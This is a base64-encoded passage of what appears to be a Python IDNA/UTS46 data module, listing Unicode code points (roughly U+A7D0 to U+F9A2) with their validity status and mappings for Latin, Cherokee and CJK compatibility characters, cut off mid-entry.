KDB4QTdEMCwgXCdNXCcsIFwnXHhlYVx4OWZceDkxXCcpLFxuICAgICgweEE3RDEsIFwnVlwnKSxcbiAgICAoMHhBN0QyLCBcJ1hcJyksXG4gICAgKDB4QTdEMywgXCdWXCcpLFxuICAgICgweEE3RDQsIFwnWFwnKSxcbiAgICAoMHhBN0Q1LCBcJ1ZcJyksXG4gICAgKDB4QTdENiwgXCdNXCcsIFwnXHhlYVx4OWZceDk3XCcpLFxuICAgICgweEE3RDcsIFwnVlwnKSxcbiAgICAoMHhBN0Q4LCBcJ01cJywgXCdceGVhXHg5Zlx4OTlcJyksXG4gICAgKDB4QTdEOSwgXCdWXCcpLFxuICAgICgweEE3REEsIFwnWFwnKSxcbiAgICAoMHhBN0YyLCBcJ01cJywgXCdjXCcpLFxuICAgICgweEE3RjMsIFwnTVwnLCBcJ2ZcJyksXG4gICAgKDB4QTdGNCwgXCdNXCcsIFwncVwnKSxcbiAgICAoMHhBN0Y1LCBcJ01cJywgXCdceGVhXHg5Zlx4YjZcJyksXG4gICAgKDB4QTdGNiwgXCdWXCcpLFxuICAgICgweEE3RjgsIFwnTVwnLCBcJ1x4YzRceGE3XCcpLFxuICAgICgweEE3RjksIFwnTVwnLCBcJ1x4YzVceDkzXCcpLFxuICAgICgweEE3RkEsIFwnVlwnKSxcbiAgICAoMHhBODJELCBcJ1hcJyksXG4gICAgKDB4QTgzMCwgXCdWXCcpLFxuICAgICgweEE4M0EsIFwnWFwnKSxcbiAgICAoMHhBODQwLCBcJ1ZcJyksXG4gICAgKDB4QTg3OCwgXCdYXCcpLFxuICAgICgweEE4ODAsIFwnVlwnKSxcbiAgICAoMHhBOEM2LCBcJ1hcJyksXG4gICAgXVxuXG5kZWYgX3NlZ18zOCgpIC0+IExpc3RbVW5pb25bVHVwbGVbaW50LCBzdHJdLCBUdXBsZVtpbnQsIHN0ciwgc3RyXV1dOlxuICAgIHJldHVybiBbXG4gICAgKDB4QThDRSwgXCdWXCcpLFxuICAgICgweEE4REEsIFwnWFwnKSxcbiAgICAoMHhBOEUwLCBcJ1ZcJyksXG4gICAgKDB4QTk1NCwgXCdYXCcpLFxuICAgICgweEE5NUYsIFwnVlwnKSxcbiAgICAoMHhBOTdELCBcJ1hcJyksXG4gICAgKDB4QTk4MCwgXCdWXCcpLFxuICAgICgweEE5Q0UsIFwnWFwnKSxcbiAgICAoMHhBOUNGLCBcJ1ZcJyksXG4gICAgKDB4QTlEQSwgXCdYXCcpLFxuICAgICgweEE5REUsIFwnVlwnKSxcbiAgICAoMHhBOUZGLCBcJ1hcJyksXG4gICAgKDB4QUEwMCwgXCdWXCcpLFxuICAgICgweEFBMzcsIFwnWFwnKSxcbiAgICAoMHhBQTQwLCBcJ1ZcJyksXG4gICAgKDB4QUE0RSwgXCdYXCcpLFxuICAgICgweEFBNTAsIFwnVlwnKSxcbiAgICAoMHhBQTVBLCBcJ1hcJyksXG4gICAgKDB4QUE1QywgXCdWXCcpLFxuICAgICgweEFBQzMsIFwnWFwnKSxcbiAgICAoMHhBQURCLCBcJ1ZcJyksXG4gICAgKDB4QUFGNywgXCdYXCcpLFxuICAgICgweEFCMDEsIFwnVlwnKSxcbiAgICAoMHhBQjA3LCBcJ1hcJyksXG4gICAgKDB4QUIwOSwgXCdWXCcpLFxuICAgICgweEFCMEYsIFwnWFwnKSxcbiAgICAoMHhBQjExLCBcJ1ZcJyksXG4gICAgKDB4QUIxNywgXCdYXCcpLFxuICAgICgweEFCMjAsIFwnVlwnKSxcbiAgICAoMHhBQjI3LCBcJ1hcJyksXG4gICAgKDB4QUIyOCwgXCdWXCcpLFxuICAgICgweEFCMkYsIFwnWFwnKSxcbiAgICAoMHhBQjMwLCBcJ1ZcJyksXG4gICAgKDB4QUI1QywgXCdNXCcsIFwnXHhlYVx4OWNceGE3XCcpLFxuICAgICgweEFCNUQsIFwnTVwnLCBcJ1x4ZWFceGFjXHhiN1wnKSxcbiAgICAoMHhBQjVFLCBcJ01cJywgXCdceGM5XHhhYlwnKSxcbiAgICAoMHhBQjVGLCBcJ01cJywgXCdceGVhXHhhZFx4OTJcJyksXG4gICAgKDB4QUI2MCwgXCdWXCcpLFxuICAgICgweEFCNjksIFwnTVwnLCBcJ1x4Y2FceDhkXCcpLFxuICAgICgweEFCNkEsIFwnVlwnKSxcbiAgICAoMHhBQjZDLCBcJ1hcJyksXG4gICAgKDB4QUI3MCwgXCdNXCcsIFwnXHhlMVx4OGVceGEwXCcpLFxuICAgICgweEFCNzEsIFwnTVwnLCBcJ1x4ZTFceDhlXHhhMVwnKSxcbiAgICAoMHhBQjcyLCBcJ01cJywgXCdceGUxXHg4ZVx4YTJcJyksXG4gICAgKDB4QUI3MywgXCdNXCcsIFwnXHhlMVx4OGVceGEzXCcpLFxuICAgICgweEFCNzQsIFwnTVwnLCBcJ1x4ZTFceDhlXHhhNFwnKSxcbiAgICAoMHhBQjc1LCBcJ01cJywgXCdceGUxXHg4ZVx4YTVcJyksXG4gICAgKDB4QUI3NiwgXCdNXCcsIFwnXHhlMVx4OGVceGE2XCcpLFxuICAgICgweEFCNzcsIFwnTVwnLCBcJ1x4ZTFceDhlXHhhN1wnKSxcbiAgICAoMHhBQjc4LCBcJ01cJywgXCdceGUxXHg4ZVx4YThcJyksXG4gICAgKDB4QUI3OSwgXCdNXCcsIFwnXHhlMVx4OGVceGE5XCcpLFxuICAgICgweEFCN0EsIFwnTVwnLCBcJ1x4ZTFceDhlXHhhYVwnKSxcbiAgICAoMHhBQjdCLCBcJ01cJywgXCdceGUxXHg4ZVx4YWJcJyksXG4gICAgKDB4QUI3QywgXCdNXCcsIFwnXHhlMVx4OGVceGFjXCcpLFxuICAgICgweEFCN0QsIFwnTVwnLCBcJ1x4ZTFceDhlXHhhZFwnKSxcbiAgICAoMHhBQjdFLCBcJ01cJywgXCdceGUxXHg4ZVx4YWVcJyksXG4gICAgKDB4QUI3RiwgXCdNXCcsIFwnXHhlMVx4OGVceGFmXCcpLFxuICAgICgweEFCODAsIFwnTVwnLCBcJ1x4ZTFceDhlXHhiMFwnKSxcbiAgICAoMHhBQjgxLCBcJ01cJywgXCdceGUxXHg4ZVx4YjFcJyksXG4gICAgKDB4QUI4MiwgXCdNXCcsIFwnXHhlMVx4OGVceGIyXCcpLFxuICAgICgweEFCODMsIFwnTVwnLCBcJ1x4ZTFceDhlXHhiM1wnKSxcbiAgICAoMHhBQjg0LCBcJ01cJywgXCdceGUxXHg4ZVx4YjRcJyksXG4gICAgKDB4QUI4NSwgXCdNXCcsIFwnXHhlMVx4OGVceGI1XCcpLFxuICAgICgweEFCODYsIFwnTVwnLCBcJ1x4ZTFceDhlXHhiNlwnKSxcbiAgICAoMHhBQjg3LCBcJ01cJywgXCdceGUxXHg4ZVx4YjdcJyksXG4gICAgKDB4QUI4OCwgXCdNXCcsIFwnXHhlMVx4OGVceGI4XCcpLFxuICAgICgweEFCODksIFwnTVwnLCBcJ1x4ZTFceDhlXHhiOVwnKSxcbiAgICAoMHhBQjhBLCBcJ01cJywgXCdceGUxXHg4ZVx4YmFcJyksXG4gICAgKDB4QUI4QiwgXCdNXCcsIFwnXHhlMVx4OGVceGJiXCcpLFxuICAgICgweEFCOEMsIFwnTVwnLCBcJ1x4ZTFceDhlXHhiY1wnKSxcbiAgICAoMHhBQjhELCBcJ01cJywgXCdceGUxXHg4ZVx4YmRcJyksXG4gICAgKDB4QUI4RSwgXCdNXCcsIFwnXHhlMVx4OGVceGJlXCcpLFxuICAgICgweEFCOEYsIFwnTVwnLCBcJ1x4ZTFceDhlXHhiZlwnKSxcbiAgICAoMHhBQjkwLCBcJ01cJywgXCdceGUxXHg4Zlx4ODBcJyksXG4gICAgKDB4QUI5MSwgXCdNXCcsIFwnXHhlMVx4OGZceDgxXCcpLFxuICAgICgweEFCOTIsIFwnTVwnLCBcJ1x4ZTFceDhmXHg4MlwnKSxcbiAgICAoMHhBQjkzLCBcJ01cJywgXCdceGUxXHg4Zlx4ODNcJyksXG4gICAgKDB4QUI5NCwgXCdNXCcsIFwnXHhlMVx4OGZceDg0XCcpLFxuICAgICgweEFCOTUsIFwnTVwnLCBcJ1x4ZTFceDhmXHg4NVwnKSxcbiAgICAoMHhBQjk2LCBcJ01cJywgXCdceGUxXHg4Zlx4ODZcJyksXG4gICAgKDB4QUI5NywgXCdNXCcsIFwnXHhlMVx4OGZceDg3XCcpLFxuICAgICgweEFCOTgsIFwnTVwnLCBcJ1x4ZTFceDhmXHg4OFwnKSxcbiAgICAoMHhBQjk5LCBcJ01cJywgXCdceGUxXHg4Zlx4ODlcJyksXG4gICAgKDB4QUI5QSwgXCdNXCcsIFwnXHhlMVx4OGZceDhhXCcpLFxuICAgICgweEFCOUIsIFwnTVwnLCBcJ1x4ZTFceDhmXHg4YlwnKSxcbiAgICAoMHhBQjlDLCBcJ01cJywgXCdceGUxXHg4Zlx4OGNcJyksXG4gICAgKDB4QUI5RCwgXCdNXCcsIFwnXHhlMVx4OGZceDhkXCcpLFxuICAgICgweEFCOUUsIFwnTVwnLCBcJ1x4ZTFceDhmXHg4ZVwnKSxcbiAgICAoMHhBQjlGLCBcJ01cJywgXCdceGUxXHg4Zlx4OGZcJyksXG4gICAgKDB4QUJBMCwgXCdNXCcsIFwnXHhlMVx4OGZceDkwXCcpLFxuICAgICgweEFCQTEsIFwnTVwnLCBcJ1x4ZTFceDhmXHg5MVwnKSxcbiAgICAoMHhBQkEyLCBcJ01cJywgXCdceGUxXHg4Zlx4OTJcJyksXG4gICAgKDB4QUJBMywgXCdNXCcsIFwnXHhlMVx4OGZceDkzXCcpLFxuICAgICgweEFCQTQsIFwnTVwnLCBcJ1x4ZTFceDhmXHg5NFwnKSxcbiAgICAoMHhBQkE1LCBcJ01cJywgXCdceGUxXHg4Zlx4OTVcJyksXG4gICAgKDB4QUJBNiwgXCdNXCcsIFwnXHhlMVx4OGZceDk2XCcpLFxuICAgICgweEFCQTcsIFwnTVwnLCBcJ1x4ZTFceDhmXHg5N1wnKSxcbiAgICAoMHhBQkE4LCBcJ01cJywgXCdceGUxXHg4Zlx4OThcJyksXG4gICAgKDB4QUJBOSwgXCdNXCcsIFwnXHhlMVx4OGZceDk5XCcpLFxuICAgICgweEFCQUEsIFwnTVwnLCBcJ1x4ZTFceDhmXHg5YVwnKSxcbiAgICBdXG5cbmRlZiBfc2VnXzM5KCkgLT4gTGlzdFtVbmlvbltUdXBsZVtpbnQsIHN0cl0sIFR1cGxlW2ludCwgc3RyLCBzdHJdXV06XG4gICAgcmV0dXJuIFtcbiAgICAoMHhBQkFCLCBcJ01cJywgXCdceGUxXHg4Zlx4OWJcJyksXG4gICAgKDB4QUJBQywgXCdNXCcsIFwnXHhlMVx4OGZceDljXCcpLFxuICAgICgweEFCQUQsIFwnTVwnLCBcJ1x4ZTFceDhmXHg5ZFwnKSxcbiAgICAoMHhBQkFFLCBcJ01cJywgXCdceGUxXHg4Zlx4OWVcJyksXG4gICAgKDB4QUJBRiwgXCdNXCcsIFwnXHhlMVx4OGZceDlmXCcpLFxuICAgICgweEFCQjAsIFwnTVwnLCBcJ1x4ZTFceDhmXHhhMFwnKSxcbiAgICAoMHhBQkIxLCBcJ01cJywgXCdceGUxXHg4Zlx4YTFcJyksXG4gICAgKDB4QUJCMiwgXCdNXCcsIFwnXHhlMVx4OGZceGEyXCcpLFxuICAgICgweEFCQjMsIFwnTVwnLCBcJ1x4ZTFceDhmXHhhM1wnKSxcbiAgICAoMHhBQkI0LCBcJ01cJywgXCdceGUxXHg4Zlx4YTRcJyksXG4gICAgKDB4QUJCNSwgXCdNXCcsIFwnXHhlMVx4OGZceGE1XCcpLFxuICAgICgweEFCQjYsIFwnTVwnLCBcJ1x4ZTFceDhmXHhhNlwnKSxcbiAgICAoMHhBQkI3LCBcJ01cJywgXCdceGUxXHg4Zlx4YTdcJyksXG4gICAgKDB4QUJCOCwgXCdNXCcsIFwnXHhlMVx4OGZceGE4XCcpLFxuICAgICgweEFCQjksIFwnTVwnLCBcJ1x4ZTFceDhmXHhhOVwnKSxcbiAgICAoMHhBQkJBLCBcJ01cJywgXCdceGUxXHg4Zlx4YWFcJyksXG4gICAgKDB4QUJCQiwgXCdNXCcsIFwnXHhlMVx4OGZceGFiXCcpLFxuICAgICgweEFCQkMsIFwnTVwnLCBcJ1x4ZTFceDhmXHhhY1wnKSxcbiAgICAoMHhBQkJELCBcJ01cJywgXCdceGUxXHg4Zlx4YWRcJyksXG4gICAgKDB4QUJCRSwgXCdNXCcsIFwnXHhlMVx4OGZceGFlXCcpLFxuICAgICgweEFCQkYsIFwnTVwnLCBcJ1x4ZTFceDhmXHhhZlwnKSxcbiAgICAoMHhBQkMwLCBcJ1ZcJyksXG4gICAgKDB4QUJFRSwgXCdYXCcpLFxuICAgICgweEFCRjAsIFwnVlwnKSxcbiAgICAoMHhBQkZBLCBcJ1hcJyksXG4gICAgKDB4QUMwMCwgXCdWXCcpLFxuICAgICgweEQ3QTQsIFwnWFwnKSxcbiAgICAoMHhEN0IwLCBcJ1ZcJyksXG4gICAgKDB4RDdDNywgXCdYXCcpLFxuICAgICgweEQ3Q0IsIFwnVlwnKSxcbiAgICAoMHhEN0ZDLCBcJ1hcJyksXG4gICAgKDB4RjkwMCwgXCdNXCcsIFwnXHhlOFx4YjFceDg4XCcpLFxuICAgICgweEY5MDEsIFwnTVwnLCBcJ1x4ZTZceDliXHhiNFwnKSxcbiAgICAoMHhGOTAyLCBcJ01cJywgXCdceGU4XHhiYlx4OGFcJyksXG4gICAgKDB4RjkwMywgXCdNXCcsIFwnXHhlOFx4YjNceDg4XCcpLFxuICAgICgweEY5MDQsIFwnTVwnLCBcJ1x4ZTZceGJiXHg5MVwnKSxcbiAgICAoMHhGOTA1LCBcJ01cJywgXCdceGU0XHhiOFx4YjJcJyksXG4gICAgKDB4RjkwNiwgXCdNXCcsIFwnXHhlNVx4OGZceGE1XCcpLFxuICAgICgweEY5MDcsIFwnTVwnLCBcJ1x4ZTlceGJlXHg5Y1wnKSxcbiAgICAoMHhGOTA5LCBcJ01cJywgXCdceGU1XHhhNVx4OTFcJyksXG4gICAgKDB4RjkwQSwgXCdNXCcsIFwnXHhlOVx4ODdceDkxXCcpLFxuICAgICgweEY5MEIsIFwnTVwnLCBcJ1x4ZTVceDk2XHg4N1wnKSxcbiAgICAoMHhGOTBDLCBcJ01cJywgXCdceGU1XHhhNVx4ODhcJyksXG4gICAgKDB4RjkwRCwgXCdNXCcsIFwnXHhlNlx4ODdceGI2XCcpLFxuICAgICgweEY5MEUsIFwnTVwnLCBcJ1x4ZTdceDk5XHhhOVwnKSxcbiAgICAoMHhGOTBGLCBcJ01cJywgXCdceGU3XHhiZVx4ODVcJyksXG4gICAgKDB4RjkxMCwgXCdNXCcsIFwnXHhlOFx4OThceGJmXCcpLFxuICAgICgweEY5MTEsIFwnTVwnLCBcJ1x4ZThceDllXHhiYVwnKSxcbiAgICAoMHhGOTEyLCBcJ01cJywgXCdceGU4XHhhM1x4YjhcJyksXG4gICAgKDB4RjkxMywgXCdNXCcsIFwnXHhlOVx4ODJceDhmXCcpLFxuICAgICgweEY5MTQsIFwnTVwnLCBcJ1x4ZTZceGE4XHg4MlwnKSxcbiAgICAoMHhGOTE1LCBcJ01cJywgXCdceGU2XHhiNFx4OWJcJyksXG4gICAgKDB4RjkxNiwgXCdNXCcsIFwnXHhlN1x4ODNceDk5XCcpLFxuICAgICgweEY5MTcsIFwnTVwnLCBcJ1x4ZTdceDhmXHg5ZVwnKSxcbiAgICAoMHhGOTE4LCBcJ01cJywgXCdceGU4XHg5MFx4YmRcJyksXG4gICAgKDB4RjkxOSwgXCdNXCcsIFwnXHhlOVx4ODVceGFhXCcpLFxuICAgICgweEY5MUEsIFwnTVwnLCBcJ1x4ZTlceGE3XHhiMVwnKSxcbiAgICAoMHhGOTFCLCBcJ01cJywgXCdceGU0XHhiYVx4ODJcJyksXG4gICAgKDB4RjkxQywgXCdNXCcsIFwnXHhlNVx4OGRceGI1XCcpLFxuICAgICgweEY5MUQsIFwnTVwnLCBcJ1x4ZTZceGFjXHg4NFwnKSxcbiAgICAoMHhGOTFFLCBcJ01cJywgXCdceGU3XHg4OFx4OWJcJyksXG4gICAgKDB4RjkxRiwgXCdNXCcsIFwnXHhlOFx4OThceGFkXCcpLFxuICAgICgweEY5MjAsIFwnTVwnLCBcJ1x4ZTlceGI4XHg5ZVwnKSxcbiAgICAoMHhGOTIxLCBcJ01cJywgXCdceGU1XHhiNVx4OTBcJyksXG4gICAgKDB4RjkyMiwgXCdNXCcsIFwnXHhlNlx4YmZceGFiXCcpLFxuICAgICgweEY5MjMsIFwnTVwnLCBcJ1x4ZThceDk3XHg4ZFwnKSxcbiAgICAoMHhGOTI0LCBcJ01cJywgXCdceGU4XHhhNVx4YTRcJyksXG4gICAgKDB4RjkyNSwgXCdNXCcsIFwnXHhlNlx4OGJceDg5XCcpLFxuICAgICgweEY5MjYsIFwnTVwnLCBcJ1x4ZThceDg3XHg5OFwnKSxcbiAgICAoMHhGOTI3LCBcJ01cJywgXCdceGU4XHhhMFx4OWZcJyksXG4gICAgKDB4RjkyOCwgXCdNXCcsIFwnXHhlNVx4YmJceDhhXCcpLFxuICAgICgweEY5MjksIFwnTVwnLCBcJ1x4ZTZceDljXHg5N1wnKSxcbiAgICAoMHhGOTJBLCBcJ01cJywgXCdceGU2XHhiNVx4YWFcJyksXG4gICAgKDB4RjkyQiwgXCdNXCcsIFwnXHhlN1x4OGJceGJjXCcpLFxuICAgICgweEY5MkMsIFwnTVwnLCBcJ1x4ZTlceDgzXHg4ZVwnKSxcbiAgICAoMHhGOTJELCBcJ01cJywgXCdceGU0XHhiZVx4ODZcJyksXG4gICAgKDB4RjkyRSwgXCdNXCcsIFwnXHhlNVx4ODZceGI3XCcpLFxuICAgICgweEY5MkYsIFwnTVwnLCBcJ1x4ZTVceDhiXHg5ZVwnKSxcbiAgICAoMHhGOTMwLCBcJ01cJywgXCdceGU2XHg5M1x4ODRcJyksXG4gICAgKDB4RjkzMSwgXCdNXCcsIFwnXHhlNlx4YWJceDkzXCcpLFxuICAgICgweEY5MzIsIFwnTVwnLCBcJ1x4ZTdceDg4XHg5MFwnKSxcbiAgICAoMHhGOTMzLCBcJ01cJywgXCdceGU3XHg5Ylx4YTdcJyksXG4gICAgKDB4RjkzNCwgXCdNXCcsIFwnXHhlOFx4ODBceDgxXCcpLFxuICAgICgweEY5MzUsIFwnTVwnLCBcJ1x4ZThceDk4XHg4NlwnKSxcbiAgICAoMHhGOTM2LCBcJ01cJywgXCdceGU4XHg5OVx4OWNcJyksXG4gICAgKDB4RjkzNywgXCdNXCcsIFwnXHhlOFx4YjdceGFmXCcpLFxuICAgICgweEY5MzgsIFwnTVwnLCBcJ1x4ZTlceDljXHhiMlwnKSxcbiAgICAoMHhGOTM5LCBcJ01cJywgXCdceGU5XHhhZFx4YWZcJyksXG4gICAgKDB4RjkzQSwgXCdNXCcsIFwnXHhlOVx4YjdceGJhXCcpLFxuICAgICgweEY5M0IsIFwnTVwnLCBcJ1x4ZTdceGEyXHg4Y1wnKSxcbiAgICAoMHhGOTNDLCBcJ01cJywgXCdceGU3XHhhNVx4YmZcJyksXG4gICAgKDB4RjkzRCwgXCdNXCcsIFwnXHhlN1x4YjZceGEwXCcpLFxuICAgICgweEY5M0UsIFwnTVwnLCBcJ1x4ZThceDhmXHg4OVwnKSxcbiAgICAoMHhGOTNGLCBcJ01cJywgXCdceGU5XHg4Y1x4ODRcJyksXG4gICAgKDB4Rjk0MCwgXCdNXCcsIFwnXHhlOVx4YjlceGJmXCcpLFxuICAgICgweEY5NDEsIFwnTVwnLCBcJ1x4ZThceGFiXHg5NlwnKSxcbiAgICAoMHhGOTQyLCBcJ01cJywgXCdceGU1XHhhM1x4OWZcJyksXG4gICAgKDB4Rjk0MywgXCdNXCcsIFwnXHhlNVx4YmNceDg0XCcpLFxuICAgICgweEY5NDQsIFwnTVwnLCBcJ1x4ZTdceGIxXHhhMFwnKSxcbiAgICAoMHhGOTQ1LCBcJ01cJywgXCdceGU4XHg4MVx4YmVcJyksXG4gICAgXVxuXG5kZWYgX3NlZ180MCgpIC0+IExpc3RbVW5pb25bVHVwbGVbaW50LCBzdHJdLCBUdXBsZVtpbnQsIHN0ciwgc3RyXV1dOlxuICAgIHJldHVybiBbXG4gICAgKDB4Rjk0NiwgXCdNXCcsIFwnXHhlN1x4ODlceGEyXCcpLFxuICAgICgweEY5NDcsIFwnTVwnLCBcJ1x4ZTdceGEzXHg4YVwnKSxcbiAgICAoMHhGOTQ4LCBcJ01cJywgXCdceGU4XHhiM1x4ODJcJyksXG4gICAgKDB4Rjk0OSwgXCdNXCcsIFwnXHhlOVx4OWJceGI3XCcpLFxuICAgICgweEY5NEEsIFwnTVwnLCBcJ1x4ZTVceGEzXHg5OFwnKSxcbiAgICAoMHhGOTRCLCBcJ01cJywgXCdceGU1XHhiMVx4YTJcJyksXG4gICAgKDB4Rjk0QywgXCdNXCcsIFwnXHhlNlx4YThceDkzXCcpLFxuICAgICgweEY5NEQsIFwnTVwnLCBcJ1x4ZTZceGI3XHg5YVwnKSxcbiAgICAoMHhGOTRFLCBcJ01cJywgXCdceGU2XHhiY1x4OGZcJyksXG4gICAgKDB4Rjk0RiwgXCdNXCcsIFwnXHhlN1x4YjRceGFmXCcpLFxuICAgICgweEY5NTAsIFwnTVwnLCBcJ1x4ZTdceGI4XHhiN1wnKSxcbiAgICAoMHhGOTUxLCBcJ01cJywgXCdceGU5XHg5OVx4OGJcJyksXG4gICAgKDB4Rjk1MiwgXCdNXCcsIFwnXHhlNVx4OGJceDkyXCcpLFxuICAgICgweEY5NTMsIFwnTVwnLCBcJ1x4ZThceDgyXHg4YlwnKSxcbiAgICAoMHhGOTU0LCBcJ01cJywgXCdceGU1XHg4N1x4OWNcJyksXG4gICAgKDB4Rjk1NSwgXCdNXCcsIFwnXHhlNVx4ODdceDhjXCcpLFxuICAgICgweEY5NTYsIFwnTVwnLCBcJ1x4ZTdceGE4XHg5Y1wnKSxcbiAgICAoMHhGOTU3LCBcJ01cJywgXCdceGU3XHhiNlx4YmVcJyksXG4gICAgKDB4Rjk1OCwgXCdNXCcsIFwnXHhlOFx4OGZceGIxXCcpLFxuICAgICgweEY5NTksIFwnTVwnLCBcJ1x4ZTlceDk5XHhiNVwnKSxcbiAgICAoMHhGOTVBLCBcJ01cJywgXCdceGU4XHhhZVx4ODBcJyksXG4gICAgKDB4Rjk1QiwgXCdNXCcsIFwnXHhlNlx4OGJceDhmXCcpLFxuICAgICgweEY5NUMsIFwnTVwnLCBcJ1x4ZTZceGE4XHg4MlwnKSxcbiAgICAoMHhGOTVELCBcJ01cJywgXCdceGU4XHhhYlx4YmVcJyksXG4gICAgKDB4Rjk1RSwgXCdNXCcsIFwnXHhlNFx4YjhceGI5XCcpLFxuICAgICgweEY5NUYsIFwnTVwnLCBcJ1x4ZTVceGFmXHhhN1wnKSxcbiAgICAoMHhGOTYwLCBcJ01cJywgXCdceGU2XHg4MFx4OTJcJyksXG4gICAgKDB4Rjk2MSwgXCdNXCcsIFwnXHhlN1x4OGVceDg3XCcpLFxuICAgICgweEY5NjIsIFwnTVwnLCBcJ1x4ZTdceDk1XHhiMFwnKSxcbiAgICAoMHhGOTYzLCBcJ01cJywgXCdceGU1XHg4Y1x4OTdcJyksXG4gICAgKDB4Rjk2NCwgXCdNXCcsIFwnXHhlN1x4YTNceGJiXCcpLFxuICAgICgweEY5NjUsIFwnTVwnLCBcJ1x4ZTRceGJlXHhiZlwnKSxcbiAgICAoMHhGOTY2LCBcJ01cJywgXCdceGU1XHhiZVx4YTlcJyksXG4gICAgKDB4Rjk2NywgXCdNXCcsIFwnXHhlNFx4YjhceDhkXCcpLFxuICAgICgweEY5NjgsIFwnTVwnLCBcJ1x4ZTZceGIzXHg4Y1wnKSxcbiAgICAoMHhGOTY5LCBcJ01cJywgXCdceGU2XHg5NVx4YjhcJyksXG4gICAgKDB4Rjk2QSwgXCdNXCcsIFwnXHhlN1x4YjRceGEyXCcpLFxuICAgICgweEY5NkIsIFwnTVwnLCBcJ1x4ZTVceDhmXHg4M1wnKSxcbiAgICAoMHhGOTZDLCBcJ01cJywgXCdceGU1XHhhMVx4OWVcJyksXG4gICAgKDB4Rjk2RCwgXCdNXCcsIFwnXHhlN1x4OWNceDgxXCcpLFxuICAgICgweEY5NkUsIFwnTVwnLCBcJ1x4ZThceDkxXHg4OVwnKSxcbiAgICAoMHhGOTZGLCBcJ01cJywgXCdceGU4XHhhYVx4YWFcJyksXG4gICAgKDB4Rjk3MCwgXCdNXCcsIFwnXHhlNlx4YWVceGJhXCcpLFxuICAgICgweEY5NzEsIFwnTVwnLCBcJ1x4ZThceGJlXHhiMFwnKSxcbiAgICAoMHhGOTcyLCBcJ01cJywgXCdceGU2XHhiMlx4ODhcJyksXG4gICAgKDB4Rjk3MywgXCdNXCcsIFwnXHhlNlx4OGJceGJlXCcpLFxuICAgICgweEY5NzQsIFwnTVwnLCBcJ1x4ZThceDhiXHhhNVwnKSxcbiAgICAoMHhGOTc1LCBcJ01cJywgXCdceGU2XHg4ZVx4YTBcJyksXG4gICAgKDB4Rjk3NiwgXCdNXCcsIFwnXHhlN1x4OTVceGE1XCcpLFxuICAgICgweEY5NzcsIFwnTVwnLCBcJ1x4ZTRceGJhXHhhZVwnKSxcbiAgICAoMHhGOTc4LCBcJ01cJywgXCdceGU1XHg4NVx4YTlcJyksXG4gICAgKDB4Rjk3OSwgXCdNXCcsIFwnXHhlNVx4ODdceDg5XCcpLFxuICAgICgweEY5N0EsIFwnTVwnLCBcJ1x4ZTZceGEyXHg4MVwnKSxcbiAgICAoMHhGOTdCLCBcJ01cJywgXCdceGU3XHhiM1x4YTdcJyksXG4gICAgKDB4Rjk3QywgXCdNXCcsIFwnXHhlOFx4ODlceGFmXCcpLFxuICAgICgweEY5N0QsIFwnTVwnLCBcJ1x4ZThceGFiXHg5MlwnKSxcbiAgICAoMHhGOTdFLCBcJ01cJywgXCdceGU5XHg4N1x4OGZcJyksXG4gICAgKDB4Rjk3RiwgXCdNXCcsIFwnXHhlNVx4OGJceGI1XCcpLFxuICAgICgweEY5ODAsIFwnTVwnLCBcJ1x4ZTVceDkxXHg4MlwnKSxcbiAgICAoMHhGOTgxLCBcJ01cJywgXCdceGU1XHhhNVx4YjNcJyksXG4gICAgKDB4Rjk4MiwgXCdNXCcsIFwnXHhlNVx4YmJceGFjXCcpLFxuICAgICgweEY5ODMsIFwnTVwnLCBcJ1x4ZTZceDk3XHg4NVwnKSxcbiAgICAoMHhGOTg0LCBcJ01cJywgXCdceGU2XHhiZlx4YmVcJyksXG4gICAgKDB4Rjk4NSwgXCdNXCcsIFwnXHhlN1x4YTRceGFhXCcpLFxuICAgICgweEY5ODYsIFwnTVwnLCBcJ1x4ZTlceDk2XHhhZFwnKSxcbiAgICAoMHhGOTg3LCBcJ01cJywgXCdceGU5XHhhOVx4YWFcJyksXG4gICAgKDB4Rjk4OCwgXCdNXCcsIFwnXHhlOVx4YmFceDk3XCcpLFxuICAgICgweEY5ODksIFwnTVwnLCBcJ1x4ZTlceGJiXHg4ZVwnKSxcbiAgICAoMHhGOThBLCBcJ01cJywgXCdceGU1XHg4YVx4OWJcJyksXG4gICAgKDB4Rjk4QiwgXCdNXCcsIFwnXHhlNlx4OWJceDg2XCcpLFxuICAgICgweEY5OEMsIFwnTVwnLCBcJ1x4ZTZceGFkXHhiN1wnKSxcbiAgICAoMHhGOThELCBcJ01cJywgXCdceGU4XHhiZFx4YTJcJyksXG4gICAgKDB4Rjk4RSwgXCdNXCcsIFwnXHhlNVx4YjlceGI0XCcpLFxuICAgICgweEY5OEYsIFwnTVwnLCBcJ1x4ZTZceDg2XHg5MFwnKSxcbiAgICAoMHhGOTkwLCBcJ01cJywgXCdceGU2XHg4OFx4ODBcJyksXG4gICAgKDB4Rjk5MSwgXCdNXCcsIFwnXHhlNlx4OTJceDlhXCcpLFxuICAgICgweEY5OTIsIFwnTVwnLCBcJ1x4ZTZceGJjXHhhM1wnKSxcbiAgICAoMHhGOTkzLCBcJ01cJywgXCdceGU3XHg4NVx4ODlcJyksXG4gICAgKDB4Rjk5NCwgXCdNXCcsIFwnXHhlN1x4OTJceDg5XCcpLFxuICAgICgweEY5OTUsIFwnTVwnLCBcJ1x4ZTdceGE3XHg4YVwnKSxcbiAgICAoMHhGOTk2LCBcJ01cJywgXCdceGU3XHhiN1x4YjRcJyksXG4gICAgKDB4Rjk5NywgXCdNXCcsIFwnXHhlOFx4ODFceGFmXCcpLFxuICAgICgweEY5OTgsIFwnTVwnLCBcJ1x4ZThceGJjXHhhNlwnKSxcbiAgICAoMHhGOTk5LCBcJ01cJywgXCdceGU4XHg5M1x4YWVcJyksXG4gICAgKDB4Rjk5QSwgXCdNXCcsIFwnXHhlOVx4ODBceGEzXCcpLFxuICAgICgweEY5OUIsIFwnTVwnLCBcJ1x4ZTlceDhkXHg4YVwnKSxcbiAgICAoMHhGOTlDLCBcJ01cJywgXCdceGU1XHg4OFx4OTdcJyksXG4gICAgKDB4Rjk5RCwgXCdNXCcsIFwnXHhlNVx4OGFceGEzXCcpLFxuICAgICgweEY5OUUsIFwnTVwnLCBcJ1x4ZTVceDkyXHhiZFwnKSxcbiAgICAoMHhGOTlGLCBcJ01cJywgXCdceGU3XHg4M1x4ODhcJyksXG4gICAgKDB4RjlBMCwgXCdNXCcsIFwnXHhlOFx4YTNceDgyXCcpLFxuICAgICgweEY5QTEsIFwnTVwnLCBcJ1x4ZThceGFhXHhhYVwnKSxcbiAgICAoMHhGOUEyLCBcJ01cJywgXCdceGU